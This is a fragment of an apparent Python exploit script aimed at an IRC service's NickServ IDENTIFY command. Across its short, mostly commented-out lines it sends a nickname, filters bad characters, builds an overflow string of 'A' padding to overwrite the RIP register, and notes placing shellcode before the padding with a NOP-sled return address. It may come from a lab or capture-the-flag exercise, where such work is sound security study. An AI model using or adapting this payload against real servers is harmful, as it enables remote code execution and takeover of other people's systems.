...
s.recv(1024)
s.recv(1024)
s.sendall("hacker")	##send nickname
...
#	if(i not in [0x00, 0x20, 0x0A, 0x0D]): ##bad chars are 0x00, 0x20, 0x0A and 0x0D
#		hex_string += format(i, '#04x')[2:]
#ascii_string = hex_string.decode("hex")

## filling the RIP with 0xFFFFFFFF42424242 (addresses can only be between 0x0000000000000000 to 0x00007FFFFFFFFFFF or between 0xFFFF800000000000 to 0xFFFFFFFFFFFFFFFF)
#string = ascii_string + 'A'*(664 - len(ascii_string)) + 'BBBB\xff\xff\xff\xff'
#s.sendall('/msg NickServ IDENTIFY hacker '+string+' mail' )
#s.recv(1024)

## sending the shell code before the AAAs and filling the RIP with the address of one of the NOP instructions
##0x00007ffff7d9ffc8
